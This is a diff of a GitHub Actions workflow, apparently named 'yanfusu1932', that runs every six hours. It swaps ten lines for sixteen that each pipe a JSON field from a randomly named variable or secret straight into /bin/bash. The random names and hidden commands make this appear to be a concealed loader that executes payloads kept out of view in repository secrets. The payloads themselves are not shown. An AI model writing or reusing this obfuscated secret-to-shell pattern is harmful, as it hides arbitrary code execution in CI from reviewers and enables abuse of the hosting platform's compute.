@@ -3,7 +3,8 @@ name: yanfusu1932
 on:
   workflow_dispatch:
   schedule:
-    - cron: '50 5/6 * * *'
+    - cron: '10 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,16 +12,22 @@ jobs:
       - uses: actions/checkout@v4
       - name: yanfusu1932
         env:
-          oj92: ${{ secrets.oj92 }}
+          s9405: ${{ secrets.s9405 }}
         run: |
-          echo $oj92 | jq -r .hetpx912 | /bin/bash
-          echo $fiw7 | jq -r .wu895 | /bin/bash
-          echo $k94374 | jq -r .u4924 | /bin/bash
-          echo $d8799 | jq -r .pxkf8 | /bin/bash
-          echo $g10733 | jq -r .qvhu1840 | /bin/bash
-          echo $zokjq2 | jq -r .ln28 | /bin/bash
-          echo $n5 | jq -r .itxo8456 | /bin/bash
-          echo $nlil3639 | jq -r .ygvhw7520 | /bin/bash
-          echo $hloht20160 | jq -r .ods624 | /bin/bash
-          echo $kg39693 | jq -r .wmv637 | /bin/bash
+          echo $s9405 | jq -r .y15 | /bin/bash
+          echo $ndkh3058 | jq -r .jfo226 | /bin/bash
+          echo $a5074 | jq -r .m7 | /bin/bash
+          echo $zax40 | jq -r .c93 | /bin/bash
+          echo $rks1 | jq -r .iau22 | /bin/bash
+          echo $vp20246 | jq -r .v839 | /bin/bash
+          echo $b247 | jq -r .pkdx43 | /bin/bash
+          echo $dgp2 | jq -r .p7 | /bin/bash
+          echo $zmac488 | jq -r .s0 | /bin/bash
+          echo $afgul8 | jq -r .kx81237 | /bin/bash
+          echo $khz93197 | jq -r .a844 | /bin/bash
+          echo $ud9 | jq -r .lzxv51171 | /bin/bash
+          echo $cysmx1750 | jq -r .o695 | /bin/bash
+          echo $xul195 | jq -r .k56 | /bin/bash
+          echo $yka490 | jq -r .vego5 | /bin/bash
+          echo $aaqqe89923 | jq -r .awfui72 | /bin/bash
 
